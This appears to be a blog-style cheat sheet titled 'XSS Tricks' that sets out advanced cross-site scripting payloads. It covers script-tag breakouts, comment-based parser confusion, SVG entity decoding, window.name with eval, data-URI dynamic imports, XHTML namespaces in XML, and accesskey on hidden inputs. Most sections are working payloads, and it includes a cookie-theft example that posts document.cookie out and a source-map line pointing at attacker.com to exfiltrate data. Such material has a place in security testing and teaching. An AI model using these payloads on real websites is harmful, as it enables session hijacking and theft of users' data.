XSS Tricks

Advanced XSS edge cases involving script parsing, SVG, window.name, source maps, dynamic imports and XML namespaces.

Closing scripts

If the input is reflected into a JavaScript variable inside double quotes, and the quotes themselves are properly escaped but characters such as < and > are not, it may still be possible to break out of the script context and achieve a successful XSS payload just by closing the script tag .

<script>
  let foo = "</script><img/src/onerror=alert(1)>";
  </script>

Comments inside scripts

If there are two injection points, one inside a JavaScript variable and another inside an HTML attribute, we can abuse how browsers parse <script> tags to achieve XSS .

<script>
  let foo = "input1";
  </script>
  <img title="input2">

On the example above we can se two script tag and two inputs that escape " and /.

The XSS payload looks like this :

<script>
  let foo = "<!--<script>";
  </script>
  <img title="</script><img/src/onerror=alert(1)>">

How does this work? In some browsers, when an HTML comment (<!--) is injected inside a <script> tag followed by another <script> tag, the browser enters a legacy parsing state known as “script data escaped state”. In this state, the first </script> is no longer treated as a valid closing tag, so the browser continues parsing until it finds another </script>. The attacker places that second closing tag inside the title attribute, which finally closes the script block and causes <img/src/onerror=alert(1)> to be interpreted as real HTML, resulting in XSS execution.

SVG shitty things

Imagine this scenario: the user input is properly escaped, so the developer believes it is safe. However, this is not always true when the input is placed inside an SVG tag. Since SVG is XML-based, parsing behaves differently. Entities such as &quot; are automatically decoded into " before the content reaches the JavaScript parser. This means that even if the input was HTML-escaped, the SVG parser will decode those characters first, potentially breaking out of the JavaScript string and leading to XSS, like this:

<svg>
  <script>let foo = "&quot;-alert(1)///";</script>
  </svg>

Another trick with SVG tags is that you can close a script tag without an actual closing script tag just by using svg and firefox :

<svg><script href=data:,alert(1) />

Window.name

window.name survives page navigations. This means that if a value is assigned to window.name on example.com, and the user later navigates to example2.com, the value of window.name will still persist and can be accessed by the new page.

window.name is not dangerous by itself. The real issue appears when a website uses it inside dangerous JavaScript sinks such as eval(), or it's used to store sensitive data.

Example:

ATTACKER WEB:

<iframe src="//victim.com" name="alert(1)"></iframe>

Here, the iframe’s name attribute becomes window.name inside victim.com

VICTIM WEB:

<script>
  	eval(name)
  </script>

This will pop-up an alert(1)

Same primitive can be used if any confidential data is stored inside window.name, for example:

VICTIM WEB:

<script>
  name = document.cookie
  </script>

ATTACKER WEB:

<script>

  fetch('/collect-cookie', {
    method:"post",
    body:name
  })

  </script>

With this we've successfully hijacked victim's cookies

Source map

Imagine we have reflected input inside a js comment

// USER_INPUT

Then we can inject a fake source map like this :

//# sourceMappingURL=https://attacker.com

With this we could exfiltrate cookies etc, the only thing is that for this exploit to function the victim should open devtools

Dynamic imports

We can execute JS using import

import('data:text/javascript,alert(1)')

XHTML namespace in XML

If we have control over an XML document with content-type text/xml we can execute JavaScript if we provide an XHTML namespace

<xml>
  <text>hello<img src="1" onerror="alert(1)"xmlns="http://www.w3.org/1999/xhtml"/></text>
  </xml>

XSS in hidden inputs

In hidden inputs a way to execute JS is by using accesskey that when certain key is pressed by the victim the script will execute :

<input type="hidden" accesskey="X" onclick="alert(1)">

This will pop-up an alert if the user press ALT + SHIFT + X or CTRL + ALT + X , this also works on other atributtes such as link :

<link rel="canonical" accesskey="X" onclick="alert(1)" />
